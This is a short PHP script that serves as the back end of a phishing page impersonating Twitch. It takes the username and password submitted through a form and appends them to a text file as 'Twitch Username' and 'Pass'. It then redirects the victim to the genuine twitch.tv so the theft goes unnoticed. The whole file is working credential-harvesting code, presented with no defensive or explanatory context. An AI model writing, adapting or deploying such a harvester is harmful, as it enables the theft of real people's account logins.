<?php

file_put_contents("usernames.txt", "Twitch Username: " . $_POST['Username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.twitch.tv/');
exit();
?>
